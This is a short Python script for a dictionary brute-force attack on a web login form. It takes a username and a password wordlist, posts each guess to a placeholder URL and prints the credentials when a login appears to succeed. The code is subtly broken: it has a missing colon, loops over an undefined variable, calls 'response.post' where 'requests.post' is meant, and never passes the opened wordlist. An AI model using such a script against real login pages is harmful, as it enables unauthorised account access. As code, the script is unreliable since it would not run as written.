import requests

def bruteforce(username, url)
    for password in password:
        password = password.strip()
        print ("Trying to bruteforce", password)
        dictionary = {
            "username": username,
            "password": password,
            "Login": "submit"

        }
        response = response.post(url, data = dictionary)
        if "Login failed" in response.content:
            pass
        else:
            print("Login sucessful")
            print("username:", username)
            print("password:", password)

page_url = "x"
username = raw_input("enter a username")
wordlist = raw_input("please choose a file")
with open (wordlist, "r") as passwords:
    bruteforce(username, page_url)